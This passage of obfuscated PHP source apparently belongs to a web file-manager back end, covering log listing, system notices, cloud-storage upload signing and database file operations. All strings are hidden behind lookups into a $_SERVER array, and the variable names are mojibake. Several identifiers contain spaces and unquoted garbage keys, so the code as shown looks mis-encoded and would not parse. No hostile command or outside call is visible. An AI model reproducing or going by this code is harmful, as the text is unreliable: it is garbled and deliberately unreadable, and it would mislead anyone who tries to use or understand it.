$ûŠ‹»Ê[$ÄôÈäØ[789]]; $Â°÷‚¹ = isset($ûŠ‹»Ê[$ÄôÈäØ[790]]) ? $ûŠ‹»Ê[$ÄôÈäØ[790]] : time(); $¿¶°£şÏ[$ÄôÈäØ[217]] = array($ÄôÈäØ[379], array($É„îíĞ, $Â°÷‚¹)); } if ($ûŠ‹»Ê[$ÄôÈäØ[33]]) { $Û “ã¡á = explode($ÄôÈäØ[50], $ûŠ‹»Ê[$ÄôÈäØ[33]]); $ƒ·³ÖúÁ = $this->typeFile(); $ÊÎéëåö = array(); foreach ($Û “ã¡á as $Ø×¬é¾) { $ÊÎéëåö[] = $Ø×¬é¾; if (isset($ƒ·³ÖúÁ[$Ø×¬é¾])) { $ÊÎéëåö = array_merge($ÊÎéëåö, $ƒ·³ÖúÁ[$Ø×¬é¾]); } } $ÊÎéëåö = array_unique($ÊÎéëåö); if ($ÊÎéëåö) { $¿¶°£şÏ[$ÄôÈäØ[33]] = array($ÄôÈäØ[7], $ÊÎéëåö); } } else { $¿¶°£şÏ[$ÄôÈäØ[33]] = array($ÄôÈäØ[2315], $ÄôÈäØ[2316]); } if (!empty($ûŠ‹»Ê[$ÄôÈäØ[2314]])) { $¿¶°£şÏ[$ÄôÈäØ[496]] = array($ÄôÈäØ[429], "\45{$ûŠ‹»Ê[$ÄôÈäØ[2314]]}\x25"); } $ˆ­Ê÷ıñ = $this->_makeOrder()->where($¿¶°£şÏ)->selectPage(); if (empty($ˆ­Ê÷ıñ[$ÄôÈäØ[415]])) { show_json(array(), !0, $ˆ­Ê÷ıñ[$ÄôÈäØ[412]]); } $ˆ­Ê÷ıñ[$ÄôÈäØ[415]] = $this->logList($ˆ­Ê÷ıñ[$ÄôÈäØ[415]]); return $ˆ­Ê÷ıñ; } private function ipAddress(&$ÏáÈç›) { $¥ëşÅÏĞ =& $_SERVER[ ÇƒŠìÀ]; if (!empty($ÏáÈç›[$¥ëşÅÏĞ[2314]])) { $³‡¯ç = IpLocation::get($ÏáÈç›[$¥ëşÅÏĞ[2314]]); } else { $³‡¯ç = LNG($¥ëşÅÏĞ[2317]); } $ÏáÈç›[$¥ëşÅÏĞ[2318]] = $³‡¯ç; } private function descZipDownload($òƒ²Ó±, &$ÚÌ²º›Ò) { $½öİÍ÷µ =& $_SERVER[ ÇƒŠìÀ]; if (!isset($òƒ²Ó±[$½öİÍ÷µ[2319]])) { return; } $™¸ş¯Û® = json_decode($òƒ²Ó±[$½öİÍ÷µ[2319]], !0); foreach ($™¸ş¯Û® as $ĞâüÍ¶Â) { try { $ä„£ô¨ = IO::infoFullSimple($ĞâüÍ¶Â[$½öİÍ÷µ[86]]); } catch (Exception $ì¿¤û›) { continue; } $òƒ²Ó±[$½öİÍ÷µ[86]] = $ĞâüÍ¶Â[$½öİÍ÷µ[86]]; $ÚÌ²º›Ò[] = $òƒ²Ó±[$½öİÍ÷µ[183]] = $ä„£ô¨[$½öİÍ÷µ[183]]; $ÚÌ²º›Ò[] = $òƒ²Ó±[$½öİÍ÷µ[2116]] = $ä„£ô¨[$½öİÍ÷µ[182]]; break; } return $òƒ²Ó±; } private function getSourceList(&$úê”™¿—) { $ôÛéóˆÍ =& $_SERVER[ ÇƒŠìÀ]; $ÑûÄ¾É = array(); foreach ($úê”™¿— as $ç¤ÜÃ–± => $ı×íŒĞ) { $àÏºàí™ = json_decode($ı×íŒĞ[$ôÛéóˆÍ[496]], !0); if ($ı×íŒĞ[$ôÛéóˆÍ[33]] == $ôÛéóˆÍ[1861]) { $àÏºàí™ = $this->descZipDownload($àÏºàí™, $ÑûÄ¾É); $úê”™¿—[$ç¤ÜÃ–±][$ôÛéóˆÍ[496]] = json_encode($àÏºàí™); continue; } if (strpos($ı×íŒĞ[$ôÛéóˆÍ[33]], $ôÛéóˆÍ[2118]) !== 0) { if (!isset($àÏºàí™[$ôÛéóˆÍ[86]]) || strpos($ı×íŒĞ[$ôÛéóˆÍ[33]], $ôÛéóˆÍ[2320]) !== 0) { continue; } try { $“‘”ƒà½ = IO::infoFullSimple($àÏºàí™[$ôÛéóˆÍ[86]]); } catch (Exception $ù½‹…¿“) { continue; } $ÑûÄ¾É[] = $àÏºàí™[$ôÛéóˆÍ[183]] = $“‘”ƒà½[$ôÛéóˆÍ[183]]; $ÑûÄ¾É[] = $àÏºàí™[$ôÛéóˆÍ[2116]] = $“‘”ƒà½[$ôÛéóˆÍ[182]]; $úê”™¿—[$ç¤ÜÃ–±][$ôÛéóˆÍ[496]] = json_encode($àÏºàí™); continue; } $ÑûÄ¾É[] = $àÏºàí™[$ôÛéóˆÍ[183]]; $ÑûÄ¾É[] = $àÏºàí™[$ôÛéóˆÍ[2116]]; if ($àÏºàí™[$ôÛéóˆÍ[33]] == $ôÛéóˆÍ[590]) { $ÑûÄ¾É[] = $àÏºàí™[$ôÛéóˆÍ[496]][$ôÛéóˆÍ[1195]]; $ÑûÄ¾É[] = $àÏºàí™[$ôÛéóˆÍ[496]][$ôÛéóˆÍ[1196]]; } if ($àÏºàí™[$ôÛéóˆÍ[33]] == $ôÛéóˆÍ[2126]) { $ÑûÄ¾É[] = $àÏºàí™[$ôÛéóˆÍ[496]][$ôÛéóˆÍ[183]]; } } if (!$ÑûÄ¾É) { return array(); } return Model($ôÛéóˆÍ[854])->sourceListInfo($ÑûÄ¾É, !0); } private function logList($Ö¥çüµ“) { $ôëÀÀÃ› =& $_SERVER[ ÇƒŠìÀ]; $ĞÏöáÑÌ = array_to_keyvalue($Ö¥çüµ“, $ôëÀÀÃ›[12], $ôëÀÀÃ›[1689]); $×İ«ùÁË = Model($ôëÀÀÃ›[569])->userListInfo(array_unique($ĞÏöáÑÌ)); $œòùúï = $this->getSourceList($Ö¥çüµ“); $êı¨Êªç = $this->typeAll(); $²†òƒ¸™ = array(); $Ù·ØÌó = array(); foreach ($Ö¥çüµ“ as $À¸å¬­ï => $§‰¿³ãÄ) { $à‡†—´ç = $§‰¿³ãÄ[$ôëÀÀÃ›[33]]; $ãúÁò¢Ê = isset($×İ«ùÁË[$§‰¿³ãÄ[$ôëÀÀÃ›[1689]]]) ? $×İ«ùÁË[$§‰¿³ãÄ[$ôëÀÀÃ›[1689]]] : !1; $‡ˆ‚†ø = strpos($à‡†—´ç, $ôëÀÀÃ›[2321]) === 0 ? LNG($ôëÀÀÃ›[2322]) : LNG($ôëÀÀÃ›[2317]); $§‰¿³ãÄ[$ôëÀÀÃ›[32]] = isset($ãúÁò¢Ê[$ôëÀÀÃ›[32]]) ? $ãúÁò¢Ê[$ôëÀÀÃ›[32]] : LNG($ôëÀÀÃ›[2317]); $§‰¿³ãÄ[$ôëÀÀÃ›[2170]] = isset($ãúÁò¢Ê[$ôëÀÀÃ›[2170]]) ? $ãúÁò¢Ê[$ôëÀÀÃ›[2170]] : $ôëÀÀÃ›[12]; $§‰¿³ãÄ[$ôëÀÀÃ›[1579]] = isset($êı¨Êªç[$à‡†—´ç]) ? $êı¨Êªç[$à‡†—´ç] : $‡ˆ‚†ø; $§‰¿³ãÄ[$ôëÀÀÃ›[2059]] = $ãúÁò¢Ê; $ù•ô§â§ = json_decode($§‰¿³ãÄ[$ôëÀÀÃ›[496]], !0); $§‰¿³ãÄ[$ôëÀÀÃ›[2314]] = isset($ù•ô§â§[$ôëÀÀÃ›[2314]]) ? $ù•ô§â§[$ôëÀÀÃ›[2314]] : $ôëÀÀÃ›[12]; $§‰¿³ãÄ[$ôëÀÀÃ›[2318]] = IpLocation::get($§‰¿³ãÄ[$ôëÀÀÃ›[2314]]); if (strpos($à‡†—´ç, $ôëÀÀÃ›[2118]) === 0 || isset($ù•ô§â§[$ôëÀÀÃ›[2116]])) { $ù•ô§â§[$ôëÀÀÃ›[89]] = $œòùúï[$ù•ô§â§[$ôëÀÀÃ›[183]]]; $ù•ô§â§[$ôëÀÀÃ›[2131]] = $œòùúï[$ù•ô§â§[$ôëÀÀÃ›[2116]]]; if ($ù•ô§â§[$ôëÀÀÃ›[33]] == $ôëÀÀÃ›[590]) { $ù•ô§â§[$ôëÀÀÃ›[496]][$ôëÀÀÃ›[1195]] = $œòùúï[$ù•ô§â§[$ôëÀÀÃ›[496]][$ôëÀÀÃ›[1195]]]; $ù•ô§â§[$ôëÀÀÃ›[496]][$ôëÀÀÃ›[1196]] = $œòùúï[$ù•ô§â§[$ôëÀÀÃ›[496]][$ôëÀÀÃ›[1196]]]; } if ($ù•ô§â§[$ôëÀÀÃ›[33]] == $ôëÀÀÃ›[2126]) { $ù•ô§â§[$ôëÀÀÃ›[496]][$ôëÀÀÃ›[183]] = $œòùúï[$ù•ô§â§[$ôëÀÀÃ›[496]][$ôëÀÀÃ›[183]]]; } if ($ù•ô§â§[$ôëÀÀÃ›[33]] == $ôëÀÀÃ›[1856]) { $ù•ô§â§[$ôëÀÀÃ›[2131]] = $ù•ô§â§[$ôëÀÀÃ›[89]]; $ù•ô§â§[$ôëÀÀÃ›[2116]] = $ù•ô§â§[$ôëÀÀÃ›[2131]][$ôëÀÀÃ›[183]]; $ù•ô§â§[$ôëÀÀÃ›[89]] = !1; $ù•ô§â§[$ôëÀÀÃ›[183]] = $ôëÀÀÃ›[12]; } if ($ù•ô§â§[$ôëÀÀÃ›[89]] && $ù•ô§â§[$ôëÀÀÃ›[89]][$ôëÀÀÃ›[180]] == $ôëÀÀÃ›[181]) { $Ù·ØÌó[] = $§‰¿³ãÄ[$ôëÀÀÃ›[445]]; unset($Ö¥çüµ“[$À¸å¬­ï]); continue; } if ($ù•ô§â§[$ôëÀÀÃ›[2131]] && $ù•ô§â§[$ôëÀÀÃ›[2131]][$ôëÀÀÃ›[180]] == $ôëÀÀÃ›[181]) { $Ù·ØÌó[] = $§‰¿³ãÄ[$ôëÀÀÃ›[445]]; unset($Ö¥çüµ“[$À¸å¬­ï]); continue; } } $§‰¿³ãÄ[$ôëÀÀÃ›[496]] = $ù•ô§â§; unset($§‰¿³ãÄ[$ôëÀÀÃ›[2323]]); $²†òƒ¸™[] = $§‰¿³ãÄ; } $this->clearSystemPathLog($Ù·ØÌó); return $²†òƒ¸™; } private function clearSystemPathLog($ï°´½ä†) { $œùî¿›‘ =& $_SERVER[ ÇƒŠìÀ]; if (count($ï°´½ä†) == 0) { return; } $Ú•ı†Ùø = array($œùî¿›‘[445] => array($œùî¿›‘[7], array_unique($ï°´½ä†))); $this->where($Ú•ı†Ùø)->delete(); } public function deviceList($ÜÈ€°ê, $åúÛÔ¯ã = 0) { $ÉÙò¨œ€ =& $_SERVER[ ÇƒŠìÀ]; $ªˆÒõÙ = array($ÉÙò¨œ€[1689] => $ÜÈ€°ê, $ÉÙò¨œ€[217] => array($ÉÙò¨œ€[1049], $åúÛÔ¯ã), $ÉÙò¨œ€[33] => $ÉÙò¨œ€[1830]); $ÔÙ«†Óà = array(); $’¡¥¶ƒ = $this->field($ÉÙò¨œ€[2324])->where($ªˆÒõÙ)->order($ÉÙò¨œ€[2129])->limit(50)->select(); foreach ($’¡¥¶ƒ as $ó—Ä»Ï‹ => $ò‹åêû) { if ($ó—Ä»Ï‹ > 0 && abs($ò‹åêû[$ÉÙò¨œ€[217]] - $’¡¥¶ƒ[$ó—Ä»Ï‹ - 1][$ÉÙò¨œ€[217]]) < 5) { continue; } $–·İµ = json_decode($ò‹åêû[$ÉÙò¨œ€[496]], !0); $ò‹åêû[$ÉÙò¨œ€[2314]] = isset($–·İµ[$ÉÙò¨œ€[2314]]) ? $–·İµ[$ÉÙò¨œ€[2314]] : $ÉÙò¨œ€[12]; unset($–·İµ[$ÉÙò¨œ€[2314]]); $Û—¾í„ = $this->deviceType($–·İµ[$ÉÙò¨œ€[2119]]); if (isset($ÔÙ«†Óà[$Û—¾í„])) { continue; } $ò‹åêû[$ÉÙò¨œ€[2318]] = IpLocation::get($ò‹åêû[$ÉÙò¨œ€[2314]]); $ò‹åêû[$ÉÙò¨œ€[496]] = $–·İµ; $ÔÙ«†Óà[$Û—¾í„] = $ò‹åêû; } return array_values($ÔÙ«†Óà); } public function deviceType($£ÇƒŸ­) { return $£ÇƒŸ­; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x6e\x6f\x74\x69\143\145\114\151\163\164"; public $field = array("\x6e\141\x6d\145", "\143\x6f\x6e\x74\145\x6e\x74", "\141\x75\x74\x68", "\155\x6f\x64\145", "\x74\151\x6d\x65", "\164\171\x70\x65", "\x6c\145\x76\145\x6c", "\145\x6e\141\x62\154\145", "\163\x6f\162\x74"); public function listData($ © ”¸£ = false, $û±”¤ıá = "\x73\157\162\x74", $ôÄñÑ¬¨ = false) { return parent::listData($ © ”¸£, $û±”¤ıá, $ôÄñÑ¬¨); } public function add($¦Ï²‹¥) { $Õù¤’Ë¥ =& $_SERVER[ ÇƒŠìÀ]; $—»£ˆ¹ş = time(); if ($¦Ï²‹¥[$Õù¤’Ë¥[16]] == $Õù¤’Ë¥[2325]) { $—»£ˆ¹ş = strtotime($¦Ï²‹¥[$Õù¤’Ë¥[196]]); } $¦Ï²‹¥[$Õù¤’Ë¥[196]] = $—»£ˆ¹ş; return parent::insert($¦Ï²‹¥); } public function update($’‰Æ¦˜, $Ãä¡ï£™) { $••ø =& $_SERVER[ ÇƒŠìÀ]; $¨²ºâõ™ = $this->listData($’‰Æ¦˜); if (!$¨²ºâõ™) { return !1; } $‡ò­İöº = time(); if ($Ãä¡ï£™[$••ø[16]] == $••ø[2325]) { $‡ò­İöº = strtotime($Ãä¡ï£™[$••ø[196]]); } $Ãä¡ï£™[$••ø[196]] = $‡ò­İöº; return parent::update($’‰Æ¦˜, $Ãä¡ï£™); } public function remove($ÜéúŒÏİ) { $ŒçæøÅÁ = $this->listData($ÜéúŒÏİ); if (!$ŒçæøÅÁ || $ŒçæøÅÁ[$_SERVER[ ÇƒŠìÀ][181]]) { return !1; } return parent::remove($ÜéúŒÏİ); } public function sort($¸àæ×ì†, $¾ô‰ŸÙ¦) { return parent::update($¸àæ×ì†, $¾ô‰ŸÙ¦); } public function enable($ÉƒØÒÀ¶, $¶¿™¼Ñ¾) { return parent::update($ÉƒØÒÀ¶, array($_SERVER[ ÇƒŠìÀ][2326] => $¶¿™¼Ñ¾)); } private function initUserOption() { $‘–£æ× =& $_SERVER[ ÇƒŠìÀ]; $this->optionType = $‘–£æ×[2327]; $this->modelType = $‘–£æ×[2328]; $this->field = array($‘–£æ×[2329], $‘–£æ×[32], $‘–£æ×[196], $‘–£æ×[33], $‘–£æ×[2330], $‘–£æ×[779], $‘–£æ×[212]); } public function userNoticeGet($â§éóœĞ = false) { $this->initUserOption(); return parent::listData($â§éóœĞ, $_SERVER[ ÇƒŠìÀ][445], !0); } public function userNoticeAdd($Ÿ¥ßÜ€ë) { $–şìÕ´ =& $_SERVER[ ÇƒŠìÀ]; $this->initUserOption(); $È™©¥ºÊ = $this->findByKey($–şìÕ´[2329], $Ÿ¥ßÜ€ë[$–şìÕ´[445]]); if ($È™©¥ºÊ) { return !0; } $îßÙ É = array($–şìÕ´[2329] => $Ÿ¥ßÜ€ë[$–şìÕ´[445]], $–şìÕ´[32] => $Ÿ¥ßÜ€ë[$–şìÕ´[32]], $–şìÕ´[196] => $Ÿ¥ßÜ€ë[$–şìÕ´[196]], $–şìÕ´[33] => isset($Ÿ¥ßÜ€ë[$–şìÕ´[33]]) ? $Ÿ¥ßÜ€ë[$–şìÕ´[33]] : 1, $–şìÕ´[2330] => isset($Ÿ¥ßÜ€ë[$–şìÕ´[2330]]) ? $Ÿ¥ßÜ€ë[$–şìÕ´[2330]] : 0, $–şìÕ´[779] => 0, $–şìÕ´[212] => 0); return parent::insert($îßÙ É); } public function userNoticeEdit($²ˆìã§÷, $ŸÔË†à÷) { $this->initUserOption(); return parent::update($²ˆìã§÷, $ŸÔË†à÷); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\145\x6d\x5f\157\160\164\151\x6f\x6e"; protected $jsonField = array("\x6d\x65\156\165", "\162\157\154\145", "\x72\x6f\154\145\x47\x72\x6f\x75\160", "\x72\145\x67\x69\163\164", "\x65\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($›ÙÜ…°×) { return "\x53\x79\163\x74\x65\155\x4f\x70\164\151\157\156\x5f{$›ÙÜ…°×}"; } protected function optionDefault($ë»³ıÄ‚ = '') { $ÊıÎæ˜° =& $_SERVER[ ÇƒŠìÀ]; if ($ë»³ıÄ‚ == $ÊıÎæ˜°[12]) { return $GLOBALS[$ÊıÎæ˜°[6]][$ÊıÎæ˜°[427]]; } } } goto A¹“¶ÅõŸ‡; EÏçË¨Ş¾¦: class PathDriverBOS extends PathDriverBaseS3 { public function __construct($™¢à‘ø«) { parent::__construct($™¢à‘ø«); } public function getHost() { $İ×Ä½û¶ =& $_SERVER[ ÇƒŠìÀ]; $õÊ›î˜Ò = str_rtrim(parent::getHost(), $İ×Ä½û¶[8] . $this->bucket); $õÊ›î˜Ò = explode($İ×Ä½û¶[200], $õÊ›î˜Ò); return $õÊ›î˜Ò[0] . $İ×Ä½û¶[200] . $this->bucket . $İ×Ä½û¶[1359] . $õÊ›î˜Ò[1]; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ØŠÌªçá) { parent::__construct($ØŠÌªçá); $this->signatureVersion($_SERVER[ ÇƒŠìÀ][233]); } public function uploadFormData($”àìÇŸ‡, $‰“ÒøáÚ = 3600) { $îÖï¦ˆ =& $_SERVER[ ÇƒŠìÀ]; $ÉÃÓ–Ú´ = $îÖï¦ˆ[215]; $Ëê²¥Ş = $îÖï¦ˆ[249]; $—È„¾£ò = $îÖï¦ˆ[259]; $ú’ÜÅ× = gmdate($îÖï¦ˆ[1360], time() + $‰“ÒøáÚ); $ƒèÛ’² = (string) time() . $îÖï¦ˆ[73] . (string) (time() + $‰“ÒøáÚ); $ÄØŠä–ƒ = array($îÖï¦ˆ[260] => $ú’ÜÅ×, $îÖï¦ˆ[263] => array(array($îÖï¦ˆ[265] => $ÉÃÓ–Ú´), array($îÖï¦ˆ[264] => $this->bucket), array($îÖï¦ˆ[266], $îÖï¦ˆ[267], $îÖï¦ˆ[12]), array($îÖï¦ˆ[270] => $—È„¾£ò), array($îÖï¦ˆ[1361] => $Ëê²¥Ş), array($îÖï¦ˆ[1362] => $this->accessKey), array($îÖï¦ˆ[1363] => $ƒèÛ’²))); $ÄØŠä–ƒ = json_encode($ÄØŠä–ƒ); $¨´Å¹º = hash_hmac($îÖï¦ˆ[249], $ƒèÛ’², $this->secret); $Ì±ÁïÍÒ = sha1($ÄØŠä–ƒ); $¿â„‹œá = hash_hmac($îÖï¦ˆ[249], $Ì±ÁïÍÒ, $¨´Å¹º); $÷ËÂäº = array($îÖï¦ˆ[265] => $ÉÃÓ–Ú´, $îÖï¦ˆ[270] => $—È„¾£ò, $îÖï¦ˆ[278] => base64_encode($ÄØŠä–ƒ), $îÖï¦ˆ[1361] => $Ëê²¥Ş, $îÖï¦ˆ[1362] => $this->accessKey, $îÖï¦ˆ[1364] => $ƒèÛ’², $îÖï¦ˆ[1365] => $¿â„‹œá, $îÖï¦ˆ[198] => $this->getHost()); return $÷ËÂäº; } public function fileOutLink($ş…™å ‚) { $Äœ«ö¹‘ =& $_SERVER[ ÇƒŠìÀ]; if (substr($ş…™å ‚, 0, 7) == $Äœ«ö¹‘[1366]) { $ş…™å ‚ = $Äœ«ö¹‘[1367] . substr($ş…™å ‚, 7); } header($Äœ«ö¹‘[164] . $ş…™å ‚); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ïµ¶˜Ä“) { $this->pathParse = $Ïµ¶˜Ä“; $this->model = Model($_SERVER[ ÇƒŠìÀ][1368]); } public function getPath($£ëş’ÒÓ) { return trim($£ëş’ÒÓ, $_SERVER[ ÇƒŠìÀ][8]); } public function pathFather($œ‘í¾”ò) { $ô®Ù÷äã = $this->parse($œ‘í¾”ò); $ô®Ù÷äã = $this->infoSimple($œ‘í¾”ò); return $ô®Ù÷äã ? $ô®Ù÷äã[$_SERVER[ ÇƒŠìÀ][182]] : !1; } public function pathThis($ÀÊÔ˜ª›) { $ÃÔø‰›˜ = $this->infoSimple($ÀÊÔ˜ª›); return $ÃÔø‰›˜ ? $ÃÔø‰›˜[$_SERVER[ ÇƒŠìÀ][32]] : !1; } public function getPathOuter($àÒÌ– ğ) { if (!$àÒÌ– ğ) { return $àÒÌ– ğ; } $”¸«Ïà = $this->parse($àÒÌ– ğ); return KodIO::make($”¸«Ïà[$_SERVER[ ÇƒŠìÀ][445]]); } public function copyFolderFromIO($™Êê¥ı, $ãê‰, $Š°àõƒ, $ı’ù‡©˜, $Ì™Ğ•£) { $†ŸáèÙø = $this->model->copyFolderFromIO($™Êê¥ı, $ãê‰, $Š°àõƒ, $ı’ù‡©˜, $Ì™Ğ•£); return KodIO::make($†ŸáèÙø); } public function isParentOf($Î³ªÂÁ, $÷Àã†Ôİ) { return $this->model->isParentOf($Î³ªÂÁ, $÷Àã†Ôİ); } public function mkfile($…ó’òø, $¬‹°¿ß = '', $ğ­ˆœî = REPEAT_RENAME) { $•å¨û¾³ =& $_SERVER[ ÇƒŠìÀ]; $œ”‘ıñ = $this->parse($…ó’òø); $…ó’òø = $œ”‘ıñ[$•å¨û¾³[445]]; for ($£®îÚé¼ = 0; $£®îÚé¼ < count($œ”‘ıñ[$•å¨û¾³[1369]]); $£®îÚé¼++) { $È£·ª° = $œ”‘ıñ[$•å¨û¾³[1369]][$£®îÚé¼]; if ($£®îÚé¼ == count($œ”‘ıñ[$•å¨û¾³[1369]]) - 1) { $…ó’òø = $this->model->mkfile($…ó’òø, $È£·ª°, $¬‹°¿ß, $ğ­ˆœî); break; } $…ó’òø = $this->model->mkdir($…ó’òø, $È£·ª°, REPEAT_SKIP); } return $this->getPathOuter($…ó’òø); } public function mkdir($¤¿ö­àü, $ÂÏå‡şË = REPEAT_SKIP) { $ÆŠÚİõŸ =& $_SERVER[ ÇƒŠìÀ]; $ï²Ïä¯Ñ = $this->parse($¤¿ö­àü); $¤¿ö­àü = $ï²Ïä¯Ñ[$ÆŠÚİõŸ[445]]; for ($İß•ÓÃ = 0; $İß•ÓÃ < count($ï²Ïä¯Ñ[$ÆŠÚİõŸ[1369]]); $İß•ÓÃ++) { $½Ñ‚Ù¥À = $ï²Ïä¯Ñ[$ÆŠÚİõŸ[1369]][$İß•ÓÃ]; $¤¿ö­àü = $this->model->mkdir($¤¿ö­àü, $½Ñ‚Ù¥À, $ÂÏå‡şË); } return $this->getPathOuter($¤¿ö­àü); } public function copyFile($Ÿ°”Ğ€÷, $ÁËÉŠê™, $ÅÚõ–§´ = REPEAT_REPLACE) { $“µó—‘ô =& $_SERVER[ ÇƒŠìÀ]; $œ¸é‘üÕ = $this->parse($ÁËÉŠê™); $ç¼İÂËç = $this->model->copy($Ÿ°”Ğ€÷, $œ¸é‘üÕ[$“µó—‘ô[445]], $ÅÚõ–§´, $œ¸é‘üÕ[$“µó—‘ô[86]]); return $ç¼İÂËç ? $this->getPathOuter($ç¼İÂËç) : !1; } public function moveFile($ÑÊ¿Ä‰¬, $‡Œ€ÅÒµ, $™§ç = REPEAT_REPLACE) { $…’šİ…Ø =& $_SERVER[ ÇƒŠìÀ]; $™üä¡‡‹ = $this->parse($‡Œ€ÅÒµ); $Ù‹Œ»¢å = $this->model->move($ÑÊ¿Ä‰¬, $™üä¡‡‹[$…’šİ…Ø[445]], $™§ç, $™üä¡‡‹[$…’šİ…Ø[86]]); return $Ù‹Œ»¢å ? $this->getPathOuter($Ù‹Œ»¢å) : !1; } public function copy($ùƒ¹™ß„, $Éå§ùå©, $‹îß™£Ş = REPEAT_REPLACE, $´ş‹Õ½ = false) { $ä¢ÕËÎ = $this->parse($Éå§ùå©); $•ùîŸÈü = $this->model->copy($ùƒ¹™ß„, $ä¢ÕËÎ[$_SERVER[ ÇƒŠìÀ][445]], $‹îß™£Ş, $´ş‹Õ½); return $•ùîŸÈü ? $this->getPathOuter($•ùîŸÈü) : !1; } public function moveSameAllow() { } public function move($êîßØê, $±Å—ÎÛ, $ä÷Êššø = REPEAT_REPLACE, $óó©•Îí = false) { $Şˆ¹ü ¢ = $this->parse($±Å—ÎÛ); $¿¾óµ›“ = $this->model->move($êîßØê, $Şˆ¹ü ¢[$_SERVER[ ÇƒŠìÀ][445]], $ä÷Êššø, $óó©•Îí); return $¿¾óµ›“ ? $this->getPathOuter($¿¾óµ›“) : !1; } public function remove($–§ Ò€­, $ŸÆ˜Ø²é = true) { return $this->model->remove($–§ Ò€­, $ŸÆ˜Ø²é); } public function rename($Ã‰İŠÚ¡, $Ä—£’„) { $‡“»ÏÅ = $this->model->rename($Ã‰İŠÚ¡, $Ä—£’„); return $‡“»ÏÅ ? $this->getPathOuter($Ã‰İŠÚ¡) : $‡“»ÏÅ; } public function size($¸ÜşšÚ¤) { $âêÔŸæÃ = $this->infoSimple($¸ÜşšÚ¤); return $âêÔŸæÃ ? $âêÔŸæÃ[$_SERVER[ ÇƒŠìÀ][78]] : 0; } public function infoSimple($«”îÃœ) { return $this->model->sourceInfo($«”îÃœ); } public function info($ãÃòùƒ) { return $this->infoParse($ãÃòùƒ); } public function infoAuth($ãŒ¹ªÅ‘) { return $this->infoParse($ãŒ¹ªÅ‘, !1, !0); } public function infoWithChildren($ñÎµ©æÏ) { return $this->infoParse($ñÎµ©æÏ, !0); } protected function infoParse($ãœØ”Ñë, $ËïÎáê = false, $äïÛçÅ = false) { if (!$ËïÎáê) { return $this->model->pathInfo($ãœØ”Ñë, $äïÛçÅ); } return $this->model->pathInfoMore($ãœØ”Ñë); } public function infoFullSimple($öø™šœ) { $Ï‚ºÙ‘ =& $_SERVER[ ÇƒŠìÀ]; $´„ä¢ÏË = explode($Ï‚ºÙ‘[8], $öø™šœ); $ºÑ¶®¿ï = implode($Ï‚ºÙ‘[8], array_splice($´„ä¢ÏË, 1)); return $this->model->pathInfoByPath($´„ä¢ÏË[0], $ºÑ¶®¿ï); } public function infoFull($à¶’âê ) { $’¶À˜ßÈ = $this->infoFullSimple($à¶’âê ); return is_array($’¶À˜ßÈ) ? $this->model->pathInfo($’¶À˜ßÈ[$_SERVER[ ÇƒŠìÀ][183]]) : !1; } public function hashSimple($Í¨äšš„) { $¥¨¦ÎÂ¼ =& $_SERVER[ ÇƒŠìÀ]; $õøî†·ä = $this->infoWithChildren($Í¨äšš„); return $õøî†·ä[$¥¨¦ÎÂ¼[519]][$¥¨¦ÎÂ¼[642]]; } public function hashMd5($áÙ£üšç) { $Ü£÷Íİ§ =& $_SERVER[ ÇƒŠìÀ]; $±íÔ»Øù = $this->infoWithChildren($áÙ£üšç); return $±íÔ»Øù[$Ü£÷Íİ§[519]][$Ü£÷Íİ§[517]]; } public function exist($ª†Î’ß) { $û—”ò»í =& $_SERVER[ ÇƒŠìÀ]; $«ÊÄõå‰ = $this->parse($ª†Î’ß); if (!$«ÊÄõå‰[$û—”ò»í[86]]) { return $this->isFile($ª†Î’ß) || $this->isFolder($ª†Î’ß); } $Å®ü»½ù = array($û—”ò»í[447] => $«ÊÄõå‰[$û—”ò»í[445]], $û—”ò»í[32] => $«ÊÄõå‰[$û—”ò»í[86]]); $‚‰Ïïì = $this->model->where($Å®ü»½ù)->find(); return $‚‰Ïïì ? !0 : !1; } public function isFile($¦éÛ¾Üî) { $¯¥¨¦¹Š =& $_SERVER[ ÇƒŠìÀ]; $ê÷€ƒğª = $this->infoSimple($¦éÛ¾Üî); return $ê÷€ƒğª && $ê÷€ƒğª[$¯¥¨¦¹Š[455]] == $¯¥¨¦¹Š[214] ? !0 : !1; } public function isFolder($°¡Š¨şÓ) { $‚™˜¼Ã» =& $_SERVER[ ÇƒŠìÀ]; $ô­Ä—š = $this->infoSimple($°¡Š¨şÓ); return $ô­Ä—š && $ô­Ä—š[$‚™˜¼Ã»[455]] == $‚™˜¼Ã»[90] ? !0 : !1; } public function listPath($Àšİ›÷·, $¶Ñş‹óß = false) { $—«‡áĞ =& $_SERVER[ ÇƒŠìÀ]; if ($Àšİ›÷· == $—«‡áĞ[12]) { return !1; } $ö‰è° = array($—«‡áĞ[447] => $Àšİ›÷·); if ($¶Ñş‹óß) { return $this->model->listSource($ö‰è°, -1); } return $this->model->listSource($ö‰è°); } public function has($¢¼ÇÀ“ç, $àÖÙ¦ÓË = false, $©«ÛòïŒ = null) { $Îª­Ü¬ =& $_SERVER[ ÇƒŠìÀ]; $åØ”Šô = $this->infoWithChildren($¢¼ÇÀ“ç); if ($àÖÙ¦ÓË) { return array($Îª­Ü¬[226] => $åØ”Šô[$Îª­Ü¬[226]], $Îª­Ü¬[225] => $åØ”Šô[$Îª­Ü¬[225]]); } return $©«ÛòïŒ ? $åØ”Šô[$Îª­Ü¬[226]] : $åØ”Šô[$Îª­Ü¬[225]]; } public function listAll($×ôïƒ‘ş) { $·ıÈ¡Åõ = IO::info($this->pathParse[$_SERVER[ ÇƒŠìÀ][86]]); if (!$·ıÈ¡Åõ) { return array(); } return $this->model->listAll($×ôïƒ‘ş); } public function getContent($ŒĞ¶õº) { return $this->model->getContent($ŒĞ¶õº); } public function setContent($¤Æ½şåÑ, $’üÔ†Ø = '') { return $this->model->setContent($¤Æ½şåÑ, $’üÔ†Ø); } public function fileSubstr($åó½†¼õ, $Ê–Â±Š, $Ğè³¦Íã) { return $this->model->fileSubstr($åó½†¼õ, $Ê–Â±Š, $Ğè³¦Íã); } public function download($ôáÒİœç, $°ôŸãü™ = '') { $¢˜•‚ = get_path_father($°ôŸãü™); $Òš€¾’² = get_path_this($°ôŸãü™); $÷Ÿ´æìÖ = $this->model->fileInfoGet($ôáÒİœç); $§†Òí× = 